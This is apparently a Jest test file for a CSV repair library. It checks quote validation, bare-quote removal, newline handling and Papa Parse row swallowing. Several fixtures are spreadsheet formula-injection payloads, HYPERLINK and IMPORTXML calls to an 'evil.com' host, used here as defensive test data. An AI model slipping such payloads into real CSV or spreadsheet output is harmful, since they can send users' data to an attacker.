import Papa from 'papaparse';

import {
  CsvMultilineQuotedFieldError,
  hasValidCsvQuoting,
  repairCsvStructure,
} from '@/lib/csv/csv-structural-repair';

// ---------------------------------------------------------------------------
// hasValidCsvQuoting
// ---------------------------------------------------------------------------
describe('hasValidCsvQuoting', () => {
  describe('valid cases', () => {
    it('accepts a line with no quotes', () => {
      expect(
        hasValidCsvQuoting(
          'alice@example.com,555-0101,Alice,Johnson,1985-03-15',
        ),
      ).toBe(true);
    });

    it('accepts a properly quoted field with comma', () => {
      expect(hasValidCsvQuoting('"Smith, Jr.",555-0101,Alice,Johnson')).toBe(
        true,
      );
    });

    it('accepts escaped quotes inside a quoted field', () => {
      expect(
        hasValidCsvQuoting('"He said ""hi""",555-0101,Alice,Johnson'),
      ).toBe(true);
    });

    it('accepts an empty quoted field', () => {
      expect(hasValidCsvQuoting('"",555-0101,Alice,Johnson')).toBe(true);
    });

    it('accepts multiple quoted fields', () => {
      expect(hasValidCsvQuoting('"foo","bar","baz"')).toBe(true);
    });

    it('accepts post-quote whitespace when allowed', () => {
      expect(hasValidCsvQuoting('"foo" ,bar')).toBe(true);
    });

    it('accepts a line with only unquoted empty fields', () => {
      expect(hasValidCsvQuoting(',,,')).toBe(true);
    });
  });

  describe('invalid cases', () => {
    it('rejects bare mid-field quote (HYPERLINK)', () => {
      expect(
        hasValidCsvQuoting(
          '+HYPERLINK("http://evil.com"),555-0103,Adam,Cook,1990-09-17',
        ),
      ).toBe(false);
    });

    it('rejects multiple bare quotes (IMPORTXML)', () => {
      expect(
        hasValidCsvQuoting(
          '=IMPORTXML("http://evil.com","//secret"),(555)101-2071,Vince,Price',
        ),
      ).toBe(false);
    });

    it('rejects unclosed quote (multiline opening)', () => {
      expect(hasValidCsvQuoting('"foo,bar')).toBe(false);
    });

    it('rejects character after closing quote that is not delimiter', () => {
      expect(hasValidCsvQuoting('"foo"x,bar')).toBe(false);
    });

    it('rejects bare quote in first field', () => {
      expect(hasValidCsvQuoting('a"b,c')).toBe(false);
    });
  });
});

// ---------------------------------------------------------------------------
// repairCsvStructure
// ---------------------------------------------------------------------------
describe('repairCsvStructure', () => {
  it('returns clean file unchanged with 0 repairs', () => {
    const input =
      'email,phone\nalice@example.com,555-0101\nbob@example.com,555-0102';
    const result = repairCsvStructure(input);
    expect(result.text).toBe(input);
    expect(result.report.linesRepaired).toBe(0);
    expect(result.report.linesInspected).toBe(2);
    expect(result.report.repairs).toEqual([]);
  });

  it('does not repair header row even if it contains quotes', () => {
    const input = '"email","phone"\nalice@example.com,555-0101';
    const result = repairCsvStructure(input);
    expect(result.text).toBe(input);
    expect(result.report.linesRepaired).toBe(0);
  });

  it('removes bare quotes from unquoted fields', () => {
    const input = 'email,phone\n+HYPERLINK("http://evil.com"),555-0103';
    const result = repairCsvStructure(input);
    expect(result.text).toBe(
      'email,phone\n+HYPERLINK(http://evil.com),555-0103',
    );
    expect(result.report.linesRepaired).toBe(1);
    expect(result.report.repairs[0].lineIndex0).toBe(1);
    expect(result.report.repairs[0].lineNumber1).toBe(2);
    expect(result.report.repairs[0].reason).toBe(
      'BARE_QUOTE_IN_UNQUOTED_FIELD',
    );
  });

  it('removes multiple bare quotes from IMPORTXML payload', () => {
    const input =
      'email,phone\n=IMPORTXML("http://evil.com","//secret"),(555)101-2071';
    const result = repairCsvStructure(input);
    expect(result.text).toBe(
      'email,phone\n=IMPORTXML(http://evil.com,//secret),(555)101-2071',
    );
    expect(result.report.linesRepaired).toBe(1);
  });

  it('preserves valid quoted fields on the same line', () => {
    const input = 'name,email\n"Smith, Jr.",alice@example.com';
    const result = repairCsvStructure(input);
    expect(result.text).toBe(input);
    expect(result.report.linesRepaired).toBe(0);
  });

  it('preserves CRLF newline style', () => {
    const input =
      'email,phone\r\nalice@example.com,555-0101\r\nbob@example.com,555-0102';
    const result = repairCsvStructure(input);
    expect(result.text).toBe(input);
    expect(result.report.newlineStyle).toBe('CRLF');
  });

  it('detects LF newline style', () => {
    const input = 'email,phone\nalice@example.com,555-0101';
    const result = repairCsvStructure(input);
    expect(result.report.newlineStyle).toBe('LF');
  });

  it('report contains accurate line references', () => {
    const input = 'email,phone\nclean,row\n+HYPERLINK("evil"),555\nclean2,row2';
    const result = repairCsvStructure(input);
    expect(result.report.linesInspected).toBe(3);
    expect(result.report.linesRepaired).toBe(1);
    const repair = result.report.repairs[0];
    expect(repair.lineIndex0).toBe(2);
    expect(repair.lineNumber1).toBe(3);
    expect(repair.original).toBe('+HYPERLINK("evil"),555');
    expect(repair.repaired).toBe('+HYPERLINK(evil),555');
  });

  it('throws CsvMultilineQuotedFieldError for unclosed quoted fields', () => {
    const input = 'email,phone\n"unclosed field,555-0101';
    expect(() => repairCsvStructure(input)).toThrow(
      CsvMultilineQuotedFieldError,
    );
  });

  it('handles trailing newline without creating phantom line', () => {
    const input = 'email,phone\nalice@example.com,555-0101\n';
    const result = repairCsvStructure(input);
    expect(result.report.linesInspected).toBe(1);
    expect(result.text).toBe('email,phone\nalice@example.com,555-0101');
  });
});

// ---------------------------------------------------------------------------
// Integration: repair eliminates Papa Parse row swallowing
// ---------------------------------------------------------------------------
describe('integration: repair eliminates row swallowing', () => {
  const rawCsv = [
    'email,phone,first_name,last_name,dob',
    'alice@example.com,555-0101,Alice,Johnson,1985-03-15',
    'bob@example.com,555-0102,Bob,Smith,1990-07-22',
    '+HYPERLINK("http://evil.com"),555-0103,Adam,Cook,1990-09-17',
    'carol@example.com,555-0104,Carol,Williams,1978-11-30',
    '=IMPORTXML("http://evil.com","//secret"),(555)101-2071,Vince,Price,1994-03-30',
    'dave@example.com,555-0105,Dave,Brown,1992-01-08',
  ].join('\n');

  it('Papa Parse swallows rows on raw input (demonstrates the bug)', () => {
    const result = Papa.parse(rawCsv, { header: true, skipEmptyLines: true });
    expect(result.data.length).toBeLessThan(6);
  });

  it('repair + Papa Parse returns all 6 data rows', () => {
    const { text: repaired } = repairCsvStructure(rawCsv);
    const result = Papa.parse(repaired, { header: true, skipEmptyLines: true });
    expect(result.data.length).toBe(6);
  });

  it('repair report shows exactly 2 repaired lines', () => {
    const { report } = repairCsvStructure(rawCsv);
    expect(report.linesRepaired).toBe(2);
    expect(report.repairs.map((r) => r.lineNumber1)).toEqual([4, 6]);
  });
});
